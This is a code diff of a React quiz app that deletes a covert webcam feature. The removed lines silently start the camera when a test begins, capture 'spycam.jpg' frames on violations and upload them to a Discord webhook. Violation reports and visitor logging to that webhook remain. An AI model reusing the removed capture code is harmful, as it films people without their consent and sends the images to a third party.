@@ -470,24 +470,7 @@ function App() {
 
   useEffect(() => { logVisitor(); }, []);
 
-  const streamRef = useRef(null);
-  const videoRef = useRef(null);
-
-  const startCamera = async () => {
-      try {
-          if (!streamRef.current) {
-              const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 } });
-              streamRef.current = stream;
-              const video = document.createElement('video');
-              video.muted = true; video.playsInline = true; video.autoplay = true; video.srcObject = stream;
-              videoRef.current = video;
-              await new Promise((resolve) => {
-                  video.onloadedmetadata = () => { video.play().then(resolve).catch(resolve); };
-                  setTimeout(resolve, 1500);
-              });
-          }
-      } catch (e) {}
-  };
+  // --- КОД ДЛЯ КАМЕРЫ ПОЛНОСТЬЮ УДАЛЕН ---
 
   const captureViolation = async (title, extraFields = []) => {
       let formData = new FormData();
@@ -501,28 +484,9 @@ function App() {
           }]
       };
 
-      if (videoRef.current && streamRef.current) {
-          try {
-              const canvas = document.createElement('canvas');
-              canvas.width = videoRef.current.videoWidth || 640; 
-              canvas.height = videoRef.current.videoHeight || 480;
-              canvas.getContext('2d').drawImage(videoRef.current, 0, 0, canvas.width, canvas.height);
-              const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.85));
-              if (blob && blob.size > 100) {
-                  formData.append('file', blob, 'spycam.jpg'); payload.embeds[0].image = { url: 'attachment://spycam.jpg' };
-              }
-          } catch(e) {}
-      }
       formData.append('payload_json', JSON.stringify(payload));
       try { await fetch(DISCORD_WEBHOOK, { method: 'POST', body: formData }); } catch(e) {}
   };
-
-  useEffect(() => {
-      if (view !== 'test') {
-          if (streamRef.current) { streamRef.current.getTracks().forEach(t => t.stop()); streamRef.current = null; }
-          if (videoRef.current) { videoRef.current = null; }
-      }
-  }, [view]);
 
   useEffect(() => {
     let intervalId = null;
@@ -602,7 +566,6 @@ function App() {
   const startTest = () => { if(tests.length === 0) return alert('Нет вопросов!'); setCustomQCount(tests.length); setView('timer_setup'); };
   
   const launchTestWithTimer = async () => {
-      await startCamera();
       const mins = parseInt(customTime) || 20;
       let qCount = parseInt(customQCount);
       if (!qCount || qCount <= 0) qCount = tests.length;
@@ -669,7 +632,6 @@ function App() {
        const newCorrectIdx = newVars.findIndex(v => v._isCorrectOriginal);
        return { ...q, variants: newVars, correctIndex: newCorrectIdx };
     });
-    await startCamera();
     const mins = parseInt(customTime) || 20; setTimeLeft(mins * 60);
     setTestSession({ questions: reShuffledQuestions, currentIdx: 0, answers: new Array(reShuffledQuestions.length).fill(null), score: 0 });
     setIsResultSaved(false); setView('test');
